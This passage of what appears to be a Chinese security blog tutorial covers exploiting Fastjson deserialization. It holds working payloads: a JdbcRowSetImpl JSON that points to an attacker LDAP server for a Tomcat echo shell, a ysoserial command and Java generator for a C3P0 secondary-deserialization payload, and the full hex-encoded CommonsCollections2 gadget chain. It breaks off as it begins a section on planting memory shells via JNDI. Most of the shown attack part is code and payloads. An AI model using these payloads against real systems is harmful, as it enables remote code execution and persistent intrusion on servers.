+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">165</span><span class="p">.</span><span class="na">252</span><span class="p">:</span><span class="n">8088</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="n">138</span><span class="p">.</span><span class="na">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="n">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="n">138</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba</span><span class="o">=</span><span class="n">1748439476</span><span class="p">;</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">FB191FA4A87502B1D47A0EF7BFEEDCB2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Priority</span><span class="p">:</span><span class="w"> </span><span class="n">u</span><span class="o">=</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">261</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">cmd</span><span class="p">:</span><span class="n">whoami</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;a&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.lang.Class&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;val&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;b&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;ldap://192.168.165.252:1389/TomcatBypass/TomcatEcho&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/8.png"
+	width="2150"
+	height="945"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/8_hu_11642ea98054ddd8.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/8_hu_109071316e9f4dd9.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="227"
+		data-flex-basis="546px"
+	
+></p>
+<h3 id="53c3p0二次反序列化">5.3.C3P0二次反序列化
+</h3><p><strong>只要存在C3P0依赖，FastJson&lt;=1.2.47通杀，FastJson本身也存在原生发序列化漏洞链，且覆盖1.2全版本，不出网也能利用</strong></p>
+<p>payload生成</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">ysoserial</span><span class="o">-</span><span class="n">all</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="n">CommonsCollections2</span><span class="w"> </span><span class="s">&#34;open -a Calculator&#34;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">payload</span><span class="p">.</span><span class="na">ser</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>将生成的payload.ser文件转为16进制</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.shiro.vuln.fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson11_C3P0</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;payload.ser&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">toByteArray</span><span class="p">(</span><span class="n">in</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">payloadHex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bytesToHex</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="n">payload</span><span class="p">.</span><span class="na">length</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// C3P0 二次反序列化</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">poc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\r\n&#34;</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;    \&#34;@type\&#34;: \&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&#34;, \r\n&#34;</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;    \&#34;userOverridesAsString\&#34;: \&#34;HexAsciiSerializedMap:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">payloadHex</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;;\&#34;\r\n&#34;</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// &lt;1.2.48 and C3P0 二次反序列化</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// poc = &#34;{\r\n&#34; </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//         + &#34;    \&#34;a\&#34;: {\r\n&#34; </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//         + &#34;        \&#34;@type\&#34;: \&#34;java.lang.Class\&#34;, \r\n&#34; </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//         + &#34;        \&#34;val\&#34;: \&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&#34;\r\n&#34; </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//         + &#34;    }, \r\n&#34; </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//         + &#34;    \&#34;b\&#34;: {\r\n&#34; </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//         + &#34;        \&#34;@type\&#34;: \&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&#34;, \r\n&#34; </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//         + &#34;        \&#34;userOverridesAsString\&#34;: \&#34;HexAsciiSerializedMap:&#34; + payloadHex + &#34;;\&#34;\r\n&#34; </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//         + &#34;    }\r\n&#34; </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//         + &#34;}&#34;;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">poc</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">poc</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">toByteArray</span><span class="p">(</span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[</span><span class="n">in</span><span class="p">.</span><span class="na">available</span><span class="p">()</span><span class="o">]</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">in</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">in</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">bytesToHex</span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bArray</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">StringBuffer</span><span class="w"> </span><span class="n">sb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuffer</span><span class="p">(</span><span class="n">length</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">sTemp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Integer</span><span class="p">.</span><span class="na">toHexString</span><span class="p">(</span><span class="n">255</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">bArray</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">sTemp</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">0</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">sb</span><span class="p">.</span><span class="na">append</span><span class="p">(</span><span class="n">sTemp</span><span class="p">.</span><span class="na">toUpperCase</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">sb</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>运行该文件，即可生成payload，需要注意fastjson版本信息，一个是小于1.2.48</strong></p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/9.png"
+	width="2483"
+	height="916"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/9_hu_fac5fbd0e8c3ca76.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/9_hu_38f73737916e4c2c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="271"
+		data-flex-basis="650px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;a&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.Class&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;val&#34;</span><span class="p">:</span> <span class="s2">&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span> 
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;b&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;userOverridesAsString&#34;</span><span class="p">:</span> <span class="s2">&#34;HexAsciiSerializedMap:ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B787000000002737200426F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E5472616E73666F726D696E67436F6D70617261746F722FF984F02BB108CC0200024C00096465636F726174656471007E00014C000B7472616E73666F726D657274002D4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E73342F5472616E73666F726D65723B7870737200406F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000E6E65775472616E73666F726D6572757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007704000000037372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E000B4C00055F6E616D6571007E000A4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E002000078700000069ECAFEBABE0000003200390A0003002207003707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507002A01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002C002D0A002B002E01000863616C632E65786508003001000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003200330A002B003401000D537461636B4D61705461626C6501001E79736F73657269616C2F50776E65723236353230383636373133363630300100204C79736F73657269616C2F50776E65723236353230383636373133363630303B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002F000E0000000C000100000005000F003800000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000034000E00000020000300000001000F0038000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000038000E0000002A000400000001000F003800000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C00000024000300020000000FA70003014CB8002F1231B6003557B1000000010036000000030001030002002000000002002100110000000A000100020023001000097571007E0018000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003C000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E727077010078737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B02000078700000000178;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="54fastjson-1267版本利用">5.4.Fastjson&lt;= 1.2.67版本利用
+</h3><p><strong>前提：FastJson版本小于1.2.67并且目标存在Shiro环境，在有shiro的情况下（不限制版本），需要开启autotype，可以通杀</strong></p>
+<p><strong>还是使用JNDI-Injection-Exploit ，开启ldap来打内存马</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
